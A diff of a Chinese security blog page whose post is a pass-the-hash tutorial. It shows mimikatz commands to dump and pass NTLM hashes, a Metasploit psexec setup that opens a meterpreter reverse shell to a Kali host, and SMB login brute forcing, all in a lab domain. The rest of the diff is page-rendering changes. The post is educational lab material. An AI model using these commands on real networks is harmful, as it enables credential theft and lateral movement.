@@ -306,23 +306,28 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PASS The Hash 也叫Hash传递攻击，简称 PTH。用户登录可以不需要明文密码只需要获取到Hash 就可以登录目标系统。</p>
+        <h3 id="简介">简介</h3>
+<p>PASS The Hash 也叫Hash传递攻击，简称
+PTH。用户登录可以不需要明文密码只需要获取到Hash 就可以登录目标系统。</p>
 <p>在域中，用户登录的账号密码大都是相同的，所以攻击者可以通过Hash传递来尝试登录内网的其他计算机.通过使用哈希传递攻击，攻击者不需要破解密码散列值</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在windows系统中，通常会使用NTLM进行身份验证，在使用NTLM做身份验证时，不会使用明文密码作为身份验证，而是使用明文密码加密过的Hash值作为身份验证的凭据。攻击者可以直接通过LM Hash 和NTLM Hash 访问远程主机或服务，而不需要提供明文密码。</p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
-<li><p>获取一台域主机的高（admin或者system）权限</p>
-</li>
-<li><p>利用mimikatz等工具导出hash</p>
-</li>
-<li><p>利用导出的hash尝试登录其他的域内主机</p>
-</li>
+<h3 id="原理">原理</h3>
+<p>在windows系统中，通常会使用NTLM进行身份验证，在使用NTLM做身份验证时，不会使用明文密码作为身份验证，而是使用明文密码加密过的Hash值作为身份验证的凭据。攻击者可以直接通过LM
+Hash 和NTLM Hash 访问远程主机或服务，而不需要提供明文密码。</p>
+<h3 id="攻击方式">攻击方式</h3>
+<ul>
+<li><p>获取一台域主机的高（admin或者system）权限</p></li>
+<li><p>利用mimikatz等工具导出hash</p></li>
+<li><p>利用导出的hash尝试登录其他的域内主机</p></li>
 </ul>
-<h3 id="hash-pth攻击"><a href="#hash-pth攻击" class="headerlink" title="hash pth攻击"></a>hash pth攻击</h3><h4 id="使用mimikatz-进行pth"><a href="#使用mimikatz-进行pth" class="headerlink" title="使用mimikatz 进行pth"></a>使用mimikatz 进行pth</h4><p>在Windows Server 2012中打开mimikatz  </p>
+<h3 id="hash-pth攻击">hash pth攻击</h3>
+<h4 id="使用mimikatz-进行pth">使用mimikatz 进行pth</h4>
+<p>在Windows Server 2012中打开mimikatz</p>
 <p><code>privilege::debug</code></p>
 <p><code>sekurlsa::msv</code></p>
 <p><img src="/posts/350b40a4/msv.png"></p>
-<p>得到hash值为  <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
-<p>但是在这里如果选择直接复制mimikatz中的信息的话，程序会直接卡死，所以可以选择开启日志 <code>log</code></p>
+<p>得到hash值为 <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
+<p>但是在这里如果选择直接复制mimikatz中的信息的话，程序会直接卡死，所以可以选择开启日志
+<code>log</code></p>
 <p><code>privilege::debug</code></p>
 <p><code>sekurlsa::pth /user:Administrator /domain:mamor /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></p>
 <p><img src="/posts/350b40a4/pth.png"></p>
@@ -331,34 +336,44 @@
 <p>成功访问到域内的另一台相同密码的机器的C盘</p>
 <p><img src="/posts/350b40a4/pth_cmd.png"></p>
 <p>对于安装KB2871991补丁后的机器，无法使用常规的哈希传递进行横向移动，但是对于Administrator（SID为500的账号）的散列值仍可以进行哈希传递。也就是说只要SID为500的账号进行横向渗透时不会被该补丁所影响。</p>
-<h4 id="利用wmiexec-py进行pth攻击"><a href="#利用wmiexec-py进行pth攻击" class="headerlink" title="利用wmiexec.py进行pth攻击"></a>利用wmiexec.py进行pth攻击</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<br>
-
-<h4 id="使用msf中的模块进行pth攻击"><a href="#使用msf中的模块进行pth攻击" class="headerlink" title="使用msf中的模块进行pth攻击"></a>使用msf中的模块进行pth攻击</h4><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>环境：</p>
-<p>Windows2012  192.168.0.161 10.10.0.161</p>
-<p>kali  192.168.0.128</p>
+<h4 id="利用wmiexec.py进行pth攻击">利用wmiexec.py进行pth攻击</h4>
+<p>下载地址：https://github.com/SecureAuthCorp/impacket</p>
+<p><br></p>
+<h4 id="使用msf中的模块进行pth攻击">使用msf中的模块进行pth攻击</h4>
+<h4 id="psexec">Psexec</h4>
+<p>环境：</p>
+<p>Windows2012 192.168.0.161 10.10.0.161</p>
+<p>kali 192.168.0.128</p>
 <p>条件 ：</p>
-<ol>
+<ol type="1">
 <li>开启445端口SMB服务（默认开启）</li>
 <li>开启admin$共享</li>
 </ol>
-<p>**<a target="_blank" rel="noopener" href="https://asecuritysite.com/encryption/lmhash">https://asecuritysite.com/encryption/lmhash</a> **</p>
-<p>可以将密码转换为LM-Hash 和 NTLM-Hash (LMHASH:NTHASH 格式) </p>
+<p><strong>https://asecuritysite.com/encryption/lmhash </strong></p>
+<p>可以将密码转换为LM-Hash 和 NTLM-Hash (LMHASH:NTHASH 格式)</p>
 <p>利用：</p>
-<p>use exploit/windows/smb/psexec<br>set RHOSTS 192.168.0.161<br>set payload windows/meterpreter/reverse_tcp（默认payload）<br>set LPORT 4444<br>set LHOST 192.168.0.128<br>set SMBUSER Administrator<br>set SMBPASS admin123!        （设置密码明文或者hash值 来进行pth）<br>set SMBDomain mamor<br>exploit</p>
+<p>use exploit/windows/smb/psexec set RHOSTS 192.168.0.161 set payload
+windows/meterpreter/reverse_tcp（默认payload） set LPORT 4444 set LHOST
+192.168.0.128 set SMBUSER Administrator set SMBPASS admin123!
+（设置密码明文或者hash值 来进行pth） set SMBDomain mamor exploit</p>
 <p><img src="/posts/350b40a4/msf_psexec.png"></p>
-<h5 id="SMB-pth攻击"><a href="#SMB-pth攻击" class="headerlink" title="SMB pth攻击"></a>SMB pth攻击</h5><p>Metasploit有一个auxiliary辅助模块，可以通过SMB登录到网络中。这个模块需要用户名和hash字典，将收集的用户名和hash制作成了字典，去爆破有效的用户名和hash组合。当然如果有用户名 密码的字典也可以使用此模块进行爆破</p>
+<h5 id="smb-pth攻击">SMB pth攻击</h5>
+<p>Metasploit有一个auxiliary辅助模块，可以通过SMB登录到网络中。这个模块需要用户名和hash字典，将收集的用户名和hash制作成了字典，去爆破有效的用户名和hash组合。当然如果有用户名
+密码的字典也可以使用此模块进行爆破</p>
 <p><code>use auxiliary/scanner/smb/smb_login</code></p>
-<p><code>set rhosts 192.168.0.157</code><br><code>set user_file /home/kali/Common/user.txt</code><br><code>set pass_file /home/kali/Common/password.txt</code><br><code>set smbdomain mamor</code><br><code>exploit</code></p>
+<p><code>set rhosts 192.168.0.157</code>
+<code>set user_file /home/kali/Common/user.txt</code>
+<code>set pass_file /home/kali/Common/password.txt</code>
+<code>set smbdomain mamor</code> <code>exploit</code></p>
 <p><img src="/posts/350b40a4/smb_pth1.png"></p>
 <p><img src="/posts/350b40a4/smb_pth2.png"></p>
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.feidao.site/wordpress/?p=2084">http://www.feidao.site/wordpress/?p=2084</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/14507846.html">https://www.cnblogs.com/zzjdbk/p/14507846.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">https://yoga7xm.top/2019/04/12/IPentest-domain3/</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzlx123/article/details/103595197">https://blog.csdn.net/zzlx123/article/details/103595197</a></p>
+<p><br></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>http://www.feidao.site/wordpress/?p=2084</p>
+<p>https://www.cnblogs.com/zzjdbk/p/14507846.html</p>
+<p>https://yoga7xm.top/2019/04/12/IPentest-domain3/</p>
+<p>https://blog.csdn.net/zzlx123/article/details/103595197</p>
 </blockquote>
 
     </div>
@@ -489,7 +504,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">3.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-pth%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">hash pth攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz-%E8%BF%9B%E8%A1%8Cpth"><span class="nav-number">4.1.</span> <span class="nav-text">使用mimikatz 进行pth</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8wmiexec-py%E8%BF%9B%E8%A1%8Cpth%E6%94%BB%E5%87%BB"><span class="nav-number">4.2.</span> <span class="nav-text">利用wmiexec.py进行pth攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf%E4%B8%AD%E7%9A%84%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8Cpth%E6%94%BB%E5%87%BB"><span class="nav-number">4.3.</span> <span class="nav-text">使用msf中的模块进行pth攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Psexec"><span class="nav-number">4.4.</span> <span class="nav-text">Psexec</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB-pth%E6%94%BB%E5%87%BB"><span class="nav-number">4.4.1.</span> <span class="nav-text">SMB pth攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">3.</span> <span class="nav-text">攻击方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-pth%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">hash pth攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz-%E8%BF%9B%E8%A1%8Cpth"><span class="nav-number">4.1.</span> <span class="nav-text">使用mimikatz 进行pth</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8wmiexec.py%E8%BF%9B%E8%A1%8Cpth%E6%94%BB%E5%87%BB"><span class="nav-number">4.2.</span> <span class="nav-text">利用wmiexec.py进行pth攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf%E4%B8%AD%E7%9A%84%E6%A8%A1%E5%9D%97%E8%BF%9B%E8%A1%8Cpth%E6%94%BB%E5%87%BB"><span class="nav-number">4.3.</span> <span class="nav-text">使用msf中的模块进行pth攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec"><span class="nav-number">4.4.</span> <span class="nav-text">Psexec</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#smb-pth%E6%94%BB%E5%87%BB"><span class="nav-number">4.4.1.</span> <span class="nav-text">SMB pth攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">5.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -505,7 +520,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -553,7 +568,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -567,7 +582,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -578,7 +593,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -718,6 +733,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
